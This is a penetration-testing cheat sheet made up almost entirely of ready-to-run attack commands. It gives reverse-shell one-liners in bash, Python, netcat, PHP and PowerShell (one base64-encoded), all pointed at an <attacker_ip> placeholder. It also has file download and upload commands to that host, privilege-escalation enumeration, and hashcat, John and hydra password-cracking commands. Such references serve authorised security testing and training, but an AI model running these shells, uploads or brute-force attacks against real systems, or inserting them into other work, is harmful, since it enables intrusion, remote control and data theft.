# Cheat Sheets

Quick reference guides for common penetration testing tasks and commands.

---

## Port Scanning Quick Reference

### Basic Nmap Scans
```bash
# Quick scan
nmap <target>

# Service version detection
nmap -sV <target>

# Script scan (default scripts)
nmap -sC <target>

# Comprehensive scan
nmap -sC -sV -oA scan <target>

# All ports
nmap -p- <target>

# UDP scan (top 1000 ports)
nmap -sU <target>

# Stealth SYN scan
nmap -sS <target>
```

### Target Specification
```bash
# Single IP
nmap 192.168.1.1

# IP range
nmap 192.168.1.1-254

# Subnet
nmap 192.168.1.0/24

# Multiple targets
nmap 192.168.1.1 192.168.1.5

# File input
nmap -iL targets.txt
```

---

## Web Enumeration

### Directory Brute Forcing
```bash
# Gobuster
gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Dirb
dirb http://<target> /usr/share/wordlists/dirb/common.txt

# Ffuf
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<target>/FUZZ
```

### Subdomain Enumeration
```bash
# Gobuster
gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Ffuf
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.<domain>
```

### Common Wordlists
```bash
# Common directories
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/Discovery/Web-Content/common.txt

# Medium directories
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# Big directories
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt

# Files
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
```

---

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1
exec 5<>/dev/tcp/<attacker_ip>/<port>;cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Python
```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Netcat
```bash
# Traditional netcat
nc -e /bin/sh <attacker_ip> <port>

# Modern netcat (no -e flag)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f
```

### PHP
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"); ?>

<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <attacker_ip> <port> >/tmp/f"); ?>
```

### PowerShell
```powershell
# One-liner
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded
$Text = '$client = New-Object System.Net.Sockets.TCPClient("<attacker_ip>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
powershell -enc $EncodedText
```

---

## Linux Privilege Escalation

### System Information
```bash
# System info
uname -a
cat /etc/issue
cat /etc/*-release

# Kernel version
uname -r

# Architecture
uname -m

# Current user
whoami
id

# Sudo permissions
sudo -l

# Groups
groups
```

### File System
```bash
# SUID files
find / -perm -u=s -type f 2>/dev/null

# SGID files
find / -perm -g=s -type f 2>/dev/null

# World writable files
find / -perm -2 -type f 2>/dev/null

# World writable directories
find / -perm -2 -type d 2>/dev/null

# Files with no owner
find / -nouser -type f 2>/dev/null

# Files with no group
find / -nogroup -type f 2>/dev/null
```

### Processes & Services
```bash
# Running processes
ps aux
ps -ef

# Process tree
pstree

# Services
systemctl list-units --type=service --state=running

# Cron jobs
crontab -l
cat /etc/crontab
ls -la /etc/cron*
```

### Network
```bash
# Network connections
netstat -antup
ss -antup

# Listening ports
netstat -tlnp
ss -tlnp

# ARP table
arp -a

# Routing table
route -n
ip route
```

---

## Windows Privilege Escalation

### System Information
```cmd
# System info
systeminfo

# OS version
ver

# Current user
whoami
whoami /priv
whoami /groups

# Users
net user
net localgroup

# Network info
ipconfig /all
netstat -an
```

### Services & Processes
```cmd
# Services
sc query
wmic service list brief

# Processes
tasklist
wmic process list brief

# Scheduled tasks
schtasks
```

### Registry
```cmd
# Auto-run programs
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Installed software
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall

# Service configurations
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

---

## File Transfer

### Python HTTP Server
```bash
# Python 2
python -m SimpleHTTPServer 8000

# Python 3
python3 -m http.server 8000

# Download
wget http://<attacker_ip>:8000/<file>
curl -O http://<attacker_ip>:8000/<file>
```

### Netcat File Transfer
```bash
# Receiver
nc -l -p <port> > <file>

# Sender
nc <ip> <port> < <file>
```

### Windows File Transfer
```powershell
# PowerShell download
Invoke-WebRequest -Uri "http://<attacker_ip>/<file>" -OutFile "<file>"
(New-Object System.Net.WebClient).DownloadFile("http://<attacker_ip>/<file>", "<file>")

# Certutil
certutil -urlcache -split -f "http://<attacker_ip>/<file>" <file>

# PowerShell upload
Invoke-RestMethod -Uri "http://<attacker_ip>/<upload_endpoint>" -Method Post -InFile "<file>"
```

---

## Password Attacks

### Hashcat
```bash
# MD5
hashcat -m 0 hash.txt wordlist.txt

# SHA1
hashcat -m 100 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 hash.txt wordlist.txt

# WPA/WPA2
hashcat -m 2500 handshake.hccapx wordlist.txt

# Rules
hashcat -m 0 hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### John the Ripper
```bash
# Basic cracking
john hash.txt

# With wordlist
john --wordlist=wordlist.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Specific format
john --format=raw-md5 hash.txt
```

### Hydra
```bash
# SSH
hydra -l <username> -P <wordlist> ssh://<target>

# FTP
hydra -l <username> -P <wordlist> ftp://<target>

# HTTP POST
hydra -l <username> -P <wordlist> <target> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# SMB
hydra -l <username> -P <wordlist> smb://<target>
```

---

## Common Ports & Services

| Port | Service | Common Vulnerabilities |
|------|---------|----------------------|
| 21 | FTP | Anonymous access, brute force |
| 22 | SSH | Weak passwords, key reuse |
| 23 | Telnet | Clear text, weak auth |
| 25 | SMTP | User enumeration, relay |
| 53 | DNS | Zone transfer, cache poisoning |
| 80 | HTTP | XSS, SQLi, directory traversal |
| 110 | POP3 | Weak passwords |
| 111 | RPC | Information disclosure |
| 135 | RPC | Buffer overflows |
| 139 | NetBIOS | Null sessions |
| 143 | IMAP | Weak passwords |
| 443 | HTTPS | SSL/TLS vulns, web app issues |
| 445 | SMB | EternalBlue, weak shares |
| 993 | IMAPS | Weak encryption |
| 995 | POP3S | Weak encryption |
| 1433 | MSSQL | Injection, weak auth |
| 3306 | MySQL | Injection, weak auth |
| 3389 | RDP | BlueKeep, brute force |
| 5432 | PostgreSQL | Injection, weak auth |
| 5985 | WinRM | Weak auth, lateral movement |

---

## Useful One-Liners

### Find & Replace in Files
```bash
# Find and replace in all files
grep -r "old_text" . | cut -d: -f1 | sort | uniq | xargs sed -i 's/old_text/new_text/g'

# Find files containing specific text
grep -r "password" /etc/ 2>/dev/null

# Find large files
find / -size +100M 2>/dev/null
```

### Network Discovery
```bash
# Ping sweep
for i in {1..254}; do ping -c 1 192.168.1.$i | grep "64 bytes" | cut -d' ' -f4 | cut -d':' -f1; done

# Port knock
for port in {1..1000}; do echo "" > /dev/tcp/192.168.1.1/$port && echo "Port $port is open"; done 2>/dev/null
```

### URL Encoding/Decoding
```bash
# URL encode
echo "test string" | xxd -plain | sed 's/\(..\)/%\1/g'

# URL decode
echo "test%20string" | sed 's/%/\\x/g' | xargs -0 printf
```